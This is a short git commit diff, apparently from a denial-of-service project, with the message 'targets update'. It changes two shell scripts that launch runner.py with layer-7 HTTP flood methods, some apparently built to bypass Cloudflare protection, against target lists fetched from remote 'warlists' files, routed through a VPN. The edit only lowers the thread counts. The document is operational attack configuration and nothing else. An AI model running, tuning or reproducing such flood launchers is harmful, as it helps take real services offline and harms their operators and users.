3b4551fa77f9c1554794bfabf98a61c95c01a918
Flux State <f1ux.state@pm.me>
2022-05-08 13:27:23 +0200

    targets update

--- scripts/run_l7_cf.sh
+++ scripts/run_l7_cf.sh
@@ -6,5 +6,5 @@ python3 runner.py \
   --config https://raw.githubusercontent.com/FluxState/warlists/main/l7_cf.lst \
   --debug \
   --http-methods CFB CFBUAM GSB \
-  --threads 384 \
+  --threads 360 \
   --vpn
--- scripts/run_l7_get-stress.sh
+++ scripts/run_l7_get-stress.sh
@@ -6,5 +6,5 @@ python3 runner.py \
   --config https://raw.githubusercontent.com/FluxState/warlists/main/l7_get-stress.lst \
   --debug \
   --http-methods GET STRESS \
-  --threads 640 \
+  --threads 464 \
   --vpn 50
